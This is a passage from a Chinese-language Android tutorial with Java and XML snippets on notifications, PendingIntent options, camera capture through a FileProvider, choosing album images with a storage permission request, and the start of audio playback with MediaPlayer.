<span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.Builder(<span class="hljs-built_in">this</span>)<br>                    .setContentTitle(<span class="hljs-string">&quot;This is content title&quot;</span>)<br>                    .setContentText(<span class="hljs-string">&quot;this is content text&quot;</span>)<br>                    .setWhen(System.currentTimeMillis())<br>                    .setSmallIcon(R.mipmap.ic_launcher)<br>                    .setLargeIcon(BitmapFactory.decodeResource(getResources(),R.mipmap.ic_launcher))<br>                    .build();<br>            notificationManager.notify(<span class="hljs-number">1</span>,notification);<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="PendingIntent"><a href="#PendingIntent" class="headerlink" title="PendingIntent"></a>PendingIntent</h3><p><code>PendingIntent</code>倾向于在某个合适的时机去执行某个动作。这里第一行代码也比喻为延迟执行的<code>Intent</code></p><p><code>PendingIntent</code>可以用几种方法提供实例</p><ul><li><code>getActivity()</code>方法</li><li><code>getBroadcast()</code>方法</li><li><code>getService()</code>方法</li></ul><p>这几个方法接收参数相同</p><ul><li>参数一：<code>Context</code></li><li>参数二：一般用不到，传入0</li><li>参数三：<code>Intent</code>对象</li><li>参数四：用于确定<code>PendingIntent</code>的行为<ul><li><code>FLAG_ONE_SHOT</code></li><li><code>FLAG_NOCREATE</code></li><li><code>FLAG_CANCEL_CURRENT</code></li><li><code>FLAG_UPDATE_CURRENT</code></li><li>通常传0即可</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">                <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>, NotificationActivity.class);<br>                <span class="hljs-type">PendingIntent</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> PendingIntent.getActivity(<span class="hljs-built_in">this</span>,<span class="hljs-number">0</span>,intent,<span class="hljs-number">0</span>);<br>...<br>    .setContentIntent(pi)<br></code></pre></td></tr></table></figure><p><strong>消失显示在系统通知栏的图标</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//方法一</span><br>.setAutoCancel(<span class="hljs-literal">true</span>)<br><span class="hljs-comment">//方法二</span><br>manager.cancel(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><ul><li><code>setSound()</code>方法用于在通知发出的时候播放一段音频。<ul><li>参数一：接收一个<code>Uri</code>参数</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">.setSound(Uri.fromFile(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/system/media/audio/ringtones/Luna.ogg&quot;</span>)))<br></code></pre></td></tr></table></figure><ul><li>通知到来的时候让手机进行振动</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">下标为0表示手机静止的时长</span><br><span class="hljs-comment">下标为1表示手机振动的时长</span><br><span class="hljs-comment">下标为2表示手机静止的时长</span><br><span class="hljs-comment">...</span><br><span class="hljs-comment">以此类推</span><br><span class="hljs-comment">*/</span><br>.setVibrate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">long</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>&#125;)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">还需要添加权限</span><br><span class="hljs-comment">*/</span><br>&lt;uses-permission android:name=<span class="hljs-string">&quot;android.permission.VIBRATE&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><ul><li>通知时控制手机LED灯的显示</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">第一个参数用于指定LED灯的颜色</span><br><span class="hljs-comment">第二个参数用于指定LED灯亮起的时长</span><br><span class="hljs-comment">第三个参数用于指定LED灯暗去的时长</span><br><span class="hljs-comment">*/</span><br>.setLights(Color.GREEN,<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>)<br></code></pre></td></tr></table></figure><ul><li>通知的默认效果</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">.setDefaults(NotificationCompat.DEFAULT_ALL)<br></code></pre></td></tr></table></figure><ul><li>显示通知长段文字</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">.setStyle(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.BigTextStyle().bigText(<span class="hljs-string">&quot;.....&quot;</span>))<br></code></pre></td></tr></table></figure><ul><li>显示一张大图片</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">.setStyle(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.BigPictureStyle().bigPicture(BitmapFactory.decodeResource(getResources(),R.drawable.big_image)))<br></code></pre></td></tr></table></figure><ul><li>设置通知的重要程度<ul><li><code>PRIORITY_DEFAULT</code>默认的重要程度</li><li><code>PRIORITY_MIN</code>表示最低的重要程度</li><li><code>PRIORITY_LOW</code>表示较低的重要程度</li><li><code>PRIORITY_HIGH</code>表示较高的重要程度</li><li><code>PRIORITY_MAX</code>表示最高的重要程度，这类通知消息必须要让用户立刻看到</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">.setPriority(NotificationCompat.PRIORITY_MAX)<br></code></pre></td></tr></table></figure><h2 id="调用摄像头和相册"><a href="#调用摄像头和相册" class="headerlink" title="调用摄像头和相册"></a>调用摄像头和相册</h2><h3 id="调用摄像头"><a href="#调用摄像头" class="headerlink" title="调用摄像头"></a>调用摄像头</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>                <span class="hljs-comment">//用于存放摄像头拍摄的照片</span><br>                <span class="hljs-comment">//getExternalCacheDir()用于获取应用关联缓冲目录</span><br>                <span class="hljs-comment">//File()参数一为目录，参数二为文件名</span><br>                <span class="hljs-type">File</span> <span class="hljs-variable">outputImage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getExternalCacheDir(),<span class="hljs-string">&quot;output_image.jpg&quot;</span>);<br>                <span class="hljs-keyword">try</span>&#123;<br>                    <span class="hljs-comment">//判断文件是否存在</span><br>                    <span class="hljs-keyword">if</span>(outputImage.exists())&#123;<br>                        <span class="hljs-comment">//文件存在则直接删除</span><br>                        outputImage.delete();<br>                    &#125;<br>                    <span class="hljs-comment">//创建新文件</span><br>                    outputImage.createNewFile();<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT&gt;=<span class="hljs-number">24</span>)&#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                    参数一：context</span><br><span class="hljs-comment">                    参数二：唯一的字符串</span><br><span class="hljs-comment">                    参数三：File对象</span><br><span class="hljs-comment">                     */</span><br>                    imageUri = FileProvider.getUriForFile(MainActivity.<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;com.example.cameraalbumtest.fileprovider&quot;</span>,outputImage);<br><br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-comment">//将File对象转化为Uri对象</span><br>                    imageUri = Uri.fromFile(outputImage);<br>                &#125;<br>                <span class="hljs-comment">//隐式intent，action为android.media.action.IMAGE_CAPTURE</span><br>                <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.media.action.IMAGE_CAPTURE&quot;</span>);<br>                <span class="hljs-comment">//指定图片存储的路径</span><br>                intent.putExtra(MediaStore.EXTRA_OUTPUT,imageUri);<br>                <span class="hljs-comment">//启动activity</span><br>                startActivityForResult(intent,TAKE_PHOTO);<br>            &#125;<br>        &#125;);<br>...<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onActivityResult</span><span class="hljs-params">(<span class="hljs-type">int</span> requestCode, <span class="hljs-type">int</span> resultCode, <span class="hljs-meta">@Nullable</span> Intent data)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (requestCode)&#123;<br>            <span class="hljs-keyword">case</span> TAKE_PHOTO:<br>                <span class="hljs-keyword">if</span>(resultCode == RESULT_OK)&#123;<br>                    <span class="hljs-keyword">try</span>&#123;<br>                        <span class="hljs-comment">//将拍摄的图片解析成Bitmap对象</span><br>                        <span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> BitmapFactory.decodeStream(getContentResolver().openInputStream(imageUri));<br>                        <span class="hljs-comment">//将Bitmap对象使用imageView呈现出来</span><br>                        picture.setImageBitmap(bitmap);<br>                    &#125;<span class="hljs-keyword">catch</span> (FileNotFoundException e)&#123;<br>                        e.printStackTrace();<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p><strong>配置文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">provider</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;androidx.core.content.FileProvider&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:authorities</span>=<span class="hljs-string">&quot;com.example.cameraalbumtest.fileprovider&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:grantUriPermissions</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:resource</span>=<span class="hljs-string">&quot;@xml/file_paths&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">meta-data</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">provider</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>file_paths.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">paths</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">files-path</span></span><br><span class="hljs-tag">        <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;my_images&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">paths</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="调用相册"><a href="#调用相册" class="headerlink" title="调用相册"></a>调用相册</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>        chooseFromAlbum.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>                <span class="hljs-comment">//检查是否有写外部存储的权限</span><br>                <span class="hljs-keyword">if</span>(ContextCompat.checkSelfPermission(MainActivity.<span class="hljs-built_in">this</span>, Manifest.permission.WRITE_EXTERNAL_STORAGE)<br>                != PackageManager.PERMISSION_GRANTED)&#123;<br>                    <span class="hljs-comment">//若没有则请求获取，利用String[]&#123;&#125;写入需要获得的权限</span><br>                    ActivityCompat.requestPermissions(MainActivity.<span class="hljs-built_in">this</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;Manifest.permission.WRITE_EXTERNAL_STORAGE&#125;,<span class="hljs-number">1</span>);<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    openAlbum();<br>                &#125;<br>            &#125;<br>        &#125;);<br>...<br>        <span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">openAlbum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.intent.action.GET_CONTENT&quot;</span>);<br>        intent.setType(<span class="hljs-string">&quot;image/*&quot;</span>);<br>        startActivityForResult(intent,CHOOSE_PHOTO);<br>    &#125;<br>...<br>        <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onRequestPermissionsResult</span><span class="hljs-params">(<span class="hljs-type">int</span> requestCode, <span class="hljs-meta">@NonNull</span> String[] permissions, <span class="hljs-meta">@NonNull</span> <span class="hljs-type">int</span>[] grantResults)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (requestCode)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">if</span>(grantResults.length&gt;<span class="hljs-number">0</span>&amp;&amp;grantResults[<span class="hljs-number">0</span>]==PackageManager.PERMISSION_GRANTED)&#123;<br>                    openAlbum();<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    Toast.makeText(<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;You denied the permission&quot;</span>,Toast.LENGTH_SHORT).show();<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>...<br>               <span class="hljs-keyword">case</span> CHOOSE_PHOTO:<br>                <span class="hljs-keyword">if</span>(resultCode == RESULT_OK)&#123;<br>                    <span class="hljs-keyword">if</span>(Build.VERSION.SDK_INT&gt;=<span class="hljs-number">19</span>)&#123;<br>                        handleImageOnKitKat(data);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span>&#123;<br>                        handleImageBeforeKitKat(data);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>...<br>        <span class="hljs-comment">//指示Lint应将此类型视为针对给定API级别，无论项目的target版本是多少</span><br>    <span class="hljs-meta">@TargetApi(19)</span><br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleImageOnKitKat</span><span class="hljs-params">(Intent data)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">imagePath</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        getData()检索intent正在操作的数据</span><br><span class="hljs-comment">        Uri代表要操作的数据</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-type">Uri</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> data.getData();<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        DocumentsContract用于定义documents provider和平台之间的连接</span><br><span class="hljs-comment">        isDocumentUri()方法用于测试给定的Uri是否为DocumentsProvider支持的Document</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span>(DocumentsContract.isDocumentUri(<span class="hljs-built_in">this</span>,uri))&#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            Uri:content://com.android.providers.media.documents/document/image%3A447</span><br><span class="hljs-comment">             */</span><br><br>            <span class="hljs-comment">//如果是document类型的Uri，则通过document id处理</span><br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            在4.4之前Uri的形式Uri ： content://media/extenral/images/media/17766</span><br><span class="hljs-comment">            在4.4之后Uri的形式content://com.android.providers.media.documents/document/image%3A82482</span><br><span class="hljs-comment">            参考https://blog.csdn.net/yancychas/article/details/76695136</span><br><span class="hljs-comment">            4.4之后的Uri经过了documents的封装</span><br><span class="hljs-comment">             */</span><br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            这里取出的docId为image:447，即取出document后面的值</span><br><span class="hljs-comment">             */</span><br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">docId</span> <span class="hljs-operator">=</span> DocumentsContract.getDocumentId(uri);<br><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            getAuthority()方法用于获取URI中authority的部分的解码</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;com.android.providers.media.documents&quot;</span>.equals(uri.getAuthority()))&#123;<br>                <span class="hljs-comment">//取出id值</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> docId.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>];<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                MediaStore用于连接medio provider 与应用程序</span><br><span class="hljs-comment">                MediaStore.Images用于收集所有MIME类型的images</span><br><span class="hljs-comment">                MIME类型是媒体类型</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">selection</span> <span class="hljs-operator">=</span> MediaStore.Images.Media._ID + <span class="hljs-string">&quot;=&quot;</span> + id;<br>                imagePath = getImagePath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,selection);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;content&quot;</span>.equalsIgnoreCase(uri.getScheme()))&#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                uri.getScheme()用于获取主机号</span><br><span class="hljs-comment">                 */</span><br>                imagePath = getImagePath(uri,<span class="hljs-literal">null</span>);<br>            &#125;<span class="hljs-keyword">else</span>  <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;file&quot;</span>.equalsIgnoreCase(uri.getScheme()))&#123;<br>                imagePath = uri.getPath();<br>            &#125;<br>            displayImage(imagePath);<br><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleImageBeforeKitKat</span><span class="hljs-params">(Intent data)</span>&#123;<br>        <span class="hljs-type">Uri</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> data.getData();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">imagePath</span> <span class="hljs-operator">=</span> getImagePath(uri,<span class="hljs-literal">null</span>);<br>        displayImage(imagePath);<br>    &#125;<br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getImagePath</span><span class="hljs-params">(Uri uri,String selection)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           query()方法用于检索数据</span><br><span class="hljs-comment">           参数一:uri 类型Uri 为检索的内容</span><br><span class="hljs-comment">           参数二:projection 类型String 要返回的列表</span><br><span class="hljs-comment">           参数三:queryArgs 类型Bundle 包含操作所需的附加消息</span><br><span class="hljs-comment">           参数四:cancellationSignal 取消正在进行的操作信号</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Cursor</span> <span class="hljs-variable">cursor</span> <span class="hljs-operator">=</span> getContentResolver().query(uri,<span class="hljs-literal">null</span>,selection,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">if</span>(cursor != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(cursor.moveToFirst())&#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                getColumnIndex(String columnName)用于获取指定列的下标</span><br><span class="hljs-comment">                 */</span><br>                path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));<br>                System.out.println(path);<br>            &#125;<br>            cursor.close();<br>        &#125;<br>        <span class="hljs-keyword">return</span> path;<br>    &#125;<br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">displayImage</span><span class="hljs-params">(String imagePath)</span>&#123;<br>        <span class="hljs-keyword">if</span>(imagePath!=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-type">Bitmap</span> <span class="hljs-variable">bitmap</span> <span class="hljs-operator">=</span> BitmapFactory.decodeFile(imagePath);<br>            picture.setImageBitmap(bitmap);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            Toast.makeText(<span class="hljs-built_in">this</span>,<span class="hljs-string">&quot;failed to get image&quot;</span>,Toast.LENGTH_SHORT).show();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="播放多媒体文件"><a href="#播放多媒体文件" class="headerlink" title="播放多媒体文件"></a>播放多媒体文件</h2><h3 id="播放音频"><a href="#播放音频" class="headerlink" title="播放音频"></a>播放音频</h3><ul><li>首先需要创建<code>MeidaPlayer</code>对象</li><li>接着调用<code>setDataSource()</code>方法设置音频文件的路径</li><li>再调用<code>prepare()</code>方法使<code>MediaPlayer</code>进入到准备状态</li><li>调用<code>start()</code>方法开始播放音频</li><li>调用<code>pause()</code>方法暂停播放</li><li>调用<code>reset()</code>方法就会停止播放</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initMediaPlayer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>           <span class="hljs-comment">// System.out.println(Environment.getExternalStorageDirectory());</span><br>            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/storage/emulated/0/Pictures&quot;</span>,<span class="hljs-string">&quot;music.mp3&quot;</span>);<br>            mediaPlayer.setDataSource(file.getPath());<br>            mediaPlayer.prepare();<span class="hljs-comment">//这里不能漏掉，否则会报错</span><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            